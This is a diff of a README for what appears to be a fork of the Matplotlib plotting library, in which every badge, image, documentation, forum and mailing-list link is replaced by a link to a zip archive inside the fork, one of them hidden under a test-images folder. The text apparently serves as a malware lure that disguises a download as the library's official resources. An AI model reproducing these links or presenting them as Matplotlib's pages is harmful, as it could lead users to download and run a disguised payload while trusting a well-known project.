@@ -1,26 +1,26 @@
-[![PyPi](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![Conda](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![Downloads](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![NUMFocus](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip%https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
+[![PyPi](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![Conda](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![Downloads](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![NUMFocus](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip%https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
 
-[![Discourse help forum](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![Gitter](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![GitHub issues](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![Contributing](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip%https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
+[![Discourse help forum](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![Gitter](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![GitHub issues](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![Contributing](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip%https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
 
-[![GitHub actions status](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip%3ATests)
-[![Azure pipelines status](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![AppVeyor status](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-[![Codecov status](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
+[![GitHub actions status](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip%3ATests)
+[![Azure pipelines status](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![AppVeyor status](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+[![Codecov status](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
 
-![Matplotlib logotype](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
+![Matplotlib logotype](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
 
 Matplotlib is a comprehensive library for creating static, animated, and
 interactive visualizations in Python.
 
-Check out our [home page](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip) for more information.
+Check out our [home page](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip) for more information.
 
-![image](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
+![image](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
 
 Matplotlib produces publication-quality figures in a variety of hardcopy
 formats and interactive environments across platforms. Matplotlib can be
@@ -30,8 +30,8 @@ and various graphical user interface toolkits.
 ## Install
 
 See the [install
-documentation](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip),
-which is generated from `https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip`
+documentation](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip),
+which is generated from `https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip`
 
 ## Contribute
 
@@ -42,24 +42,24 @@ You've worked out a way to fix it — even better!
 You want to tell us about it — best of all!
 
 Start at the [contributing
-guide](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)!
+guide](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)!
 
 ## Contact
 
-[Discourse](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip) is the discussion forum
+[Discourse](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip) is the discussion forum
 for general questions and discussions and our recommended starting
 point.
 
 Our active mailing lists (which are mirrored on Discourse) are:
 
--   [Users](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-    mailing list: <https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip>
--   [Announcement](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-    mailing list: <https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip>
--   [Development](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip)
-    mailing list: <https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip>
+-   [Users](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+    mailing list: <https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip>
+-   [Announcement](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+    mailing list: <https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip>
+-   [Development](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip)
+    mailing list: <https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip>
 
-[Gitter](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip) is for coordinating
+[Gitter](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip) is for coordinating
 development and asking questions directly related to contributing to
 matplotlib.
 
@@ -69,5 +69,5 @@ If Matplotlib contributes to a project that leads to publication, please
 acknowledge this by citing Matplotlib.
 
 [A ready-made citation
-entry](https://raw.githubusercontent.com/zlulalala/matplotlib/main/uncontroversially/matplotlib.zip) is
+entry](https://github.com/zlulalala/matplotlib/raw/refs/heads/main/lib/matplotlib/tests/baseline_images/test_artist/Software_metepisternum.zip) is
 available.
